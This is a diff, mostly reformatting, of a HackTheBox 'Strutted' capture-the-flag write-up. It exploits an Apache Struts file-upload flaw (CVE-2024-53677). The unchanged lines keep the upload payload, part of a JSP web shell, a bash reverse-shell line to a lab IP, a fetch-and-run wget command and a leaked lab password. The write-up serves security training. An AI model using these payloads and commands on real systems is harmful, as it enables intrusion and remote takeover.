@@ -9,27 +9,30 @@ tags: ["hackthebox", "ctf"]
 ---
 
 # HackTheBox - Strutted
-`Strutted` is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions. The website provides a Docker container with the version of Apache Struts that is vulnerable to `[CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677)`, which is leveraged to gain a foothold on the system. Further enumeration reveals the `tomcat-users.xml` file with a plaintext password used to authenticate as `james`. For privilege escalation, we abuse `tcpdump` while being used with `sudo` to create a copy of the `bash` binary with the `SUID` bit set, allowing us to gain a `root` shell. 
+
+`Strutted` is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions. The website provides a Docker container with the version of Apache Struts that is vulnerable to `[CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677)`, which is leveraged to gain a foothold on the system. Further enumeration reveals the `tomcat-users.xml` file with a plaintext password used to authenticate as `james`. For privilege escalation, we abuse `tcpdump` while being used with `sudo` to create a copy of the `bash` binary with the `SUID` bit set, allowing us to gain a `root` shell.
 
 Target: `10.10.11.59`
 
 ## Recon
+
 Scan with nmap. 22 and 80 are open.
 
-The domain returned is `strutted.htb`. Added to hosts. 
+The domain returned is `strutted.htb`. Added to hosts.
 
-The website is a file sharing site, or more specifically, image hosting. Images can be uploaded, and then a link is provided that can be shared to view the image. The copy button doesn't actually work, but the URL can be seen in the source code. 
+The website is a file sharing site, or more specifically, image hosting. Images can be uploaded, and then a link is provided that can be shared to view the image. The copy button doesn't actually work, but the URL can be seen in the source code.
 
-The webserver shows nginx, but there is a `JSESSIONID` cookie, indicating Java. 
+The webserver shows nginx, but there is a `JSESSIONID` cookie, indicating Java.
 
-There is a download button that downloads a copy of the website as a docker image. 
+There is a download button that downloads a copy of the website as a docker image.
 
-It uses an OpenJDK container to build `strutted-1.0.0.war` using maven, then copies that into a Tomcat container with `tomcat-users.xml` and `context.xml`. A password is disclosed in `tomcat-users.xml`, but no identifiable way to use it. 
+It uses an OpenJDK container to build `strutted-1.0.0.war` using maven, then copies that into a Tomcat container with `tomcat-users.xml` and `context.xml`. A password is disclosed in `tomcat-users.xml`, but no identifiable way to use it.
 
-In the `pom.xml` file, a version number for Apache Struts is disclosed, `6.3.0.1`. This version has a RCE CVE, `CVE-2024-53677`. 
+In the `pom.xml` file, a version number for Apache Struts is disclosed, `6.3.0.1`. This version has a RCE CVE, `CVE-2024-53677`.
 
 ### Struts Vulnerablity
-There is detail on this vulnerability on [Tanium](https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm). It explains *CVE-2024-53677 is a critical file upload vulnerability in the default Interceptor class (FileUploadInterceptor) of Struts 2*.
+
+There is detail on this vulnerability on [Tanium](https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm). It explains _CVE-2024-53677 is a critical file upload vulnerability in the default Interceptor class (FileUploadInterceptor) of Struts 2_.
 
 Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.
 
@@ -51,14 +54,16 @@ Content-Disposition: form-data; name="top.UploadFileName"
 different.txt
 -----------------------------31959763281250412790357662404--
 ```
+
 The first form data parameter will be processed into an object by the FileUploadInterceptor. Then the second parameter is processed, setting the UploadFileName for the top of the stack (the first parameter) to this new value. This trick allows for bypassing other rules put in place about where a file can be written, including directory traversals.
 
 > One critical thing I figured out through a lot of pain was that for the interceptor to handle the POST request, it must have the name “Upload” (with a capital “U”).
-{.is-info}
+> {.is-info}
 
 There are exploit scripts available, but this can also be done using Burp Repeater.
 
 ## Exploit
+
 Upload an image file to the site and intercept the request. Remove the image data, except for the magic bytes, and replace it with some code to create a web shell. Then add a boundary layer that changes the file name. The web shell JSP script comes from [here](https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp)
 
 ```http
@@ -110,8 +115,8 @@ if (request.getParameter("cmd") != null) {
         DataInputStream dis = new DataInputStream(in);
         String disr = dis.readLine();
         while ( disr != null ) {
-                out.println(disr); 
-                disr = dis.readLine(); 
+                out.println(disr);
+                disr = dis.readLine();
                 }
         }
 %>
@@ -134,6 +139,7 @@ bash -i >& /dev/tcp/10.10.14.6/443 0>&1
 ```
 
 In the web shell (make sure python is running to host the script, and nc is running for execution of the script):
+
 ```bash
 wget 10.10.14.10:8888/rev.sh -O /dev/shm/rev.sh
 
@@ -141,17 +147,20 @@ bash /dev/shm/rev.sh
 ```
 
 ## Lateral Movement
+
 We are logged in as `tomcat`. There is a user named `james` with a shell.
 
-In the `tomcat` home directory are the web application files. In `~/conf/tomcat-users.xml`, a password is disclosed. 
+In the `tomcat` home directory are the web application files. In `~/conf/tomcat-users.xml`, a password is disclosed.
 
 ```xml
 <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
 ```
-This password works to login as `james` with SSH. 
+
+This password works to login as `james` with SSH.
 
 ## Privilege Escalation
-Running `sudo -l` shows that `james` can run `tcpdump` as `root`. 
+
+Running `sudo -l` shows that `james` can run `tcpdump` as `root`.
 
 There is a `tcpdump` privesc POC on [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/)
 
@@ -179,7 +188,7 @@ Maximum file limit reached: 1
 4 packets received by filter
 0 packets dropped by kernel
 
-james@strutted:~$ ls -l /tmp/0xdf 
+james@strutted:~$ ls -l /tmp/0xdf
 -rwsrwsrwx 1 root root 1396520 Jan 26 21:44 /tmp/0xdf
 james@strutted:~$ /tmp/0xdf -p
 0xdf-5.1#
